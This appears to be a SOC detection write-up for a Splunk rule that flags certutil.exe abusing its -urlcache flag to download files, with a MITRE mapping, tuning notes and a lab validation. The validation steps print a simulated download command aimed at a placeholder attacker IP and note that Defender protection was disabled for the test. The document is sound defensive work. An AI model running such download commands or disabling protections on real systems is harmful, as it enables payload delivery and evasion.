# Detection ID: LOL-001

## Detection Name
LOLBIN Abuse — certutil.exe Used for File Download

## Business/Security Risk
`certutil.exe` is a legitimate, digitally-signed Windows binary intended for certificate management. Attackers abuse its `-urlcache` flag to download malicious payloads from the internet while evading detection tools that trust signed Microsoft binaries — a technique known as "Living Off the Land" (LOLBIN).

## Required Data Sources / Fields
- **Log Source:** Sysmon
- **Sourcetype:** `WinEventLog:Microsoft-Windows-Sysmon/Operational`
- **Event Code:** 1 (Process Create)
- **Required Fields:** `Image`, `CommandLine`, `ParentImage`

## SPL Query

```spl
index=* host=DESKTOP-DI2GMCC EventCode=1 Image="*certutil.exe" CommandLine="*urlcache*"
```

## MITRE ATT&CK Mapping
- **Tactic:** Command and Control / Defense Evasion
- **Technique:** T1105 — Ingress Tool Transfer
- **Technique:** T1218.001 — System Binary Proxy Execution (Signed Binary Proxy Execution)

## Severity
**High** — successful use enables delivery of malicious payloads while bypassing binary-trust-based defenses.

## Expected Alert Evidence
- `certutil.exe` invoked with `-urlcache -split -f` flags pointing to an external URL.
- Often spawned from a suspicious parent process such as `powershell.exe` or `cmd.exe`.

## Known False Positives
- Legitimate certificate management tasks using certutil (e.g., `-store`, `-verify`) — these do not use the `-urlcache` flag and are excluded by design.

## Tuning Logic and Exclusions
Query is scoped specifically to the `urlcache` flag rather than any certutil usage, eliminating false positives from legitimate certificate operations by design.

## Validation Procedure and Result
1. Simulated attacker technique: executed `certutil.exe -urlcache -split -f http://<attacker-ip>/fake_payload.exe`.
2. Windows Defender initially blocked the command (confirming its known-malicious signature); Real-time Protection was temporarily disabled to complete the simulation and validate the Splunk-layer detection independently.
3. SPL query successfully identified the event.
4. Tested legitimate certutil usage (`certutil.exe -store My`) — query correctly returned no new matches.
5. **Result:** Detection validated ✅, no false positives observed.

## Limitations and Telemetry Dependencies
- Relies on Sysmon Process Creation events and CommandLine field visibility.
- Other LOLBINs (rundll32.exe, mshta.exe, regsvr32.exe, bitsadmin.exe) are not covered by this specific rule and would require separate detections.
- Windows Defender's native prevention capability provides a complementary defense-in-depth layer to this detection.

---
**Created:** September 9, 2026
**Status:** Validated — production-ready.
